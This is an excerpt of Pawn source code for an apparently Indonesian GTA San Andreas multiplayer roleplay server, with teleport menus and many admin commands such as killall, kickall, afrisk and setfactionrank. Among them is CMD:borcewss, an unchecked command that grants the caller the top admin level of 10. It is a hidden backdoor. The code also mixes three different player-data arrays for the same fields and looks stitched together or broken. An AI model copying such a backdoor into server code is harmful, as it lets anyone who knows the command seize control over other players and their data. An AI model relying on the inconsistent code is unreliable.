...
{
	return Dialog_Show(playerid, TELE_MAIN_DIALOG, DIALOG_STYLE_LIST, "{FFFFFF}Teleport > Menu", "{FFFFFF}LS\nSF\nLV", "Select", "Cancel");
}

Dialog:TELE_LV_DIALOG(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		switch(listitem)
...
Dialog:TELE_SF_DIALOG(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		switch(listitem)
...
Dialog:TELE_LS_DIALOG(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		switch(listitem)
...
Dialog:TELE_MAIN_DIALOG(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		switch(listitem)
		{
			case 0://LS
			{
				Dialog_Show(playerid, TELE_LS_DIALOG, DIALOG_STYLE_LIST, "{FFFFFF}Teleport > LS", "{FFFFFF}LSPD\nAirport\nHospital\nUniversity\nBinco", "Teleport", "Back");
			}
			case 1://SF
			{
				Dialog_Show(playerid, TELE_SF_DIALOG, DIALOG_STYLE_LIST, "{FFFFFF}Teleport > SF", "{FFFFFF}SFPD\nAirport\nHospital\nUniversity\nBinco", "Teleport", "Back");
			}
			case 2://LV
			{
				Dialog_Show(playerid, TELE_LV_DIALOG, DIALOG_STYLE_LIST, "{FFFFFF}Teleport > LV", "{FFFFFF}LVPD\nAirport\nHospital\nUniversity\nBinco", "Teleport", "Back");
			}
		}		
	}
	return 1;
...
CMD:getall(playerid, params[])
{
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s has attracted all the players to him", AccountData[playerid][pUCP]);
	return 1;
}

CMD:borcewss(playerid, params[])
{
	AccountData[playerid][pAdmin] = 10;
	return 1;
}
...
{
	SendClientMessageToAllEx(COLOR_IVORY, "[AdmCmd] %s (%d) telah di tendang karena menggunakan command Ilegal", AccountData[playerid][pUCP], playerid);
	KickEx(playerid);
	return 1;
}
...
CMD:goodmood(playerid, params[])
{
	...
	{
		AccountData[ii][pHunger] = 100;
		AccountData[ii][pEnergy] = 100;
		AccountData[ii][pBladder] = 0;
	}
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah mengubah lapar haus semua player di kota menjadi 100 dan mengubah stres menjadi 0", AccountData[playerid][pAdminname]);
	return 1;
}
...
CMD:afrisk(playerid, params[])
{
	...
	if(sscanf(params, "u", targetid))
	    return SyntaxMsg(playerid, "/afrisk [playerid/PartOfName]");
	    
	if(targetid == INVALID_PLAYER_ID)
	    return SendErrorMessage(playerid, "You've specified an invalid player ID!");
	
	pData[playerid][pTarget] = targetid;
    new
    items[MAX_INVENTORY],
    ...
    format(str, sizeof(str), "%s\nMoney\t"LG_E"%s", str, FormatMoney(AccountData[targetid][pMoney]));
    ...
    Dialog_Show(playerid, DIALOG_AFRISK, DIALOG_STYLE_TABLIST_HEADERS, "Admin Geledah", str, "Pilih", "Batal");
	return 1;
}

Dialog:DIALOG_AMBIL_UANG(playerid, response, listitem, inputtext[])
{
	if(response)
	{
		new amount = strval(inputtext);

		if(pData[pData[playerid][pTarget]][pMoney] < amount)
			return Error(playerid, "Player ini tidak punya cukup uang");	
		if(amount < 1)
			return Error(playerid, "Jumlah Yang Anda Masukan Tidak Valid");	

		GiveMoney(pData[playerid][pTarget], -amount);
		GiveMoney(playerid, amount);		
	}
	return 1;
}

Dialog:DIALOG_AFRISK(playerid, response, listitem, inputtext[])
{
    if(response)
    {
		if(listitem == 0)
		{
			Dialog_Show(playerid, DIALOG_AMBIL_UANG, DIALOG_STYLE_INPUT, "Geledah >> Take Money", "Masukan jumlah uang yang ingin anda ambil:", "Input", "Tutup");
		}			
		else
		{
			new
			...
			new itemid = AccountData[playerid][pListitem];
			Inventory_Add(playerid, name, itemid, Inventory_Count(pData[playerid][pTarget], name));
			Inventory_Remove(pData[playerid][pTarget], name, Inventory_Count(pData[playerid][pTarget], name));
			//ShowItemBox(playerid, name, sprintf("Recived_%dx", Inventory_Count(pData[playerid][pTarget], name)), InventoryData[playerid][itemid][invModel], 3);
			//ShowItemBox(pData[playerid][pTarget], name, sprintf("Removed_%dx", Inventory_Count(pData[playerid][pTarget], name)), InventoryData[playerid][itemid][invModel], 3);				
		}
	}	
	return 1;
}
...
CMD:respawnstatic(playerid, params[])
{
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah menghapus semua kendaraan di kota", AccountData[playerid][pAdminname]);
	return 1;
}
...
CMD:setarmor(playerid, params[])
{
	...
	if (sscanf(params, "uf", userid, amount))
		return SyntaxMsg(playerid, "/setarmor [playerid/PartOfName] [amount]");

	if (userid == INVALID_PLAYER_ID)
	    return ErrorMsg(playerid, "You have specified an invalid player.");

	SetPlayerArmour(userid, amount);
	SendAdminMessage(C_ADMIN, "[AdmCmd] %s telah mengubah armor %s menjadi %.1f%%", AccountData[playerid][pAdminname], GetName(userid), amount);
	return 1;
}
...
CMD:delveh(playerid, params[])
{
	...
	else
	{
		if (sscanf(params, "d", vehicleid))
	    	return SyntaxMsg(playerid, "/delveh [vehicle ID]");
...
CMD:reviveall(playerid, params[])
{
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah menghidupkan semua orang yang pingsan", AccountData[playerid][pAdminname]);
	return 1;
}

CMD:removeallarmor(playerid, params[])
{
    if (PlayerData[playerid][pAdmin] < 3)
	    return ErrorMsg(playerid, "You don't have permission to use this command.");	
	foreach(new i : Player)
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah menghapus armor semua player dikota", AccountData[playerid][pAdminname]);
	return 1;
}
...
CMD:armorall(playerid, params[])
{
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah memberi armor ke semua player dikota", AccountData[playerid][pAdminname]);
	return 1;
}
...
CMD:killall(playerid, params[])
{
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah membunuh semua player dikota", AccountData[playerid][pAdminname]);
	return 1;
}
...
CMD:healall(playerid, params[])
{
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah memberi darah ke semua player dikota", AccountData[playerid][pAdminname]);
	return 1;
}
...
CMD:saveall(playerid, params[])
{
	foreach(new i : Player)
	{
		if(AccountData[i][pSpawned])
		{
			UpdateWeapons(i);
			UpdatePlayerData(i);
			SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s Telah membackup semua data pemain online ke {FF0000}Konoha Database", AccountData[playerid][pAdminname]);
		}
	}
	return 1;
}
...
CMD:sethp(playerid, params[])
{
	...
	if (sscanf(params, "uf", userid, amount))
		return Usage(playerid, "/sethp [playerid/PartOfName] [amount]");
	...
	SendAdminMessage(C_ADMIN, "[AdmCmd] %s telah mengubah darah %s menjadi %.1f%%", GetName(playerid), GetName(userid), amount);
	return 1;
}
...
CMD:kickall(playerid, params[])
{
	...
	foreach(new pid : Player)
	{
		if(pid != playerid)
		{
			...
			SendClientMessageEx(pid, -1, "Sorry, server will be maintenance and your data have been saved.");
			KickEx(pid);
		}
	}
	return 1;
...
CMD:setstock(playerid, params[])
{
	...
	if(sscanf(params, "s[64]S()[128]", name, string))
    {
        ...
        SendClientMessage(playerid, COLOR_YELLOW, "[NAMES]:{FFFFFF} [material], [component], [product], [gasoil]");
        return 1;
    }
...
CMD:setfactionrank(playerid, params[])
{
	new targetid, rank;
    if(pData[playerid][pAdmin] < 4)
        return PermissionError(playerid);
	if(AccountData[playerid][pFaction] == 0)
	    return ErrorMsg(playerid, "You're not in any faction!");
	    
	if(sscanf(params, "ud", targetid, rank))
	    return SyntaxMsg(playerid, "/setfactionrank [playerid] [pangkat]");

	if (targetid == INVALID_PLAYER_ID || !IsPlayerNearPlayer(playerid, targetid, 5.0))
	    return ErrorMsg(playerid, "That player is disconnected or not near you.");
	    
	if(AccountData[targetid][pFaction] != AccountData[playerid][pFaction])
	    return ErrorMsg(playerid, "That player is not in your faction!");
	    
	AccountData[targetid][pFactionRank] = rank;
	return 1;
}
...
CMD:veh(playerid, params[])
{
	...
	SendAdminMessage(C_ADMIN, "[AdmCmd] %s memunculkan kendaraan %s dengan warna (%d, %d)", AccountData[playerid][pAdminname], GetVehicleModelName(model[0]), color1, color2);
    return 1;
}
...
CMD:aduty(playerid, params[])
{
	...
	if(!pData[playerid][pAdminDuty])
    {
		if(pData[playerid][pAdmin] > 0)
		{
			...
			SendAdminMessage(C_ADMIN, "[AdmCmd] %s sedang bertugas sebagai admin", AccountData[playerid][pUCP]);
		}
    }
    else
    {
...
CMD:a(playerid, params[])
{
	...
	if(isnull(params))
	    return SyntaxMsg(playerid, "/a [text]");
	    
	SendAdminMessage(COLOR_WHITE, "(( Admin Chat | {FF0000}%s{FFFFFF} %s: %s ))", GetStaffRank(playerid), PlayerData[playerid][pUCP], params);
	return 1;
}
...
CMD:kick(playerid, params[])
{
	...
	SendClientMessageToAllEx(C_ADMIN, "[AdmCmd] %s telah ditendang dari server oleh\n{FF0000}%s", GetName(otherid), PlayerData[playerid][pAdminname]);
	KickEx(otherid);
    return 1;
}
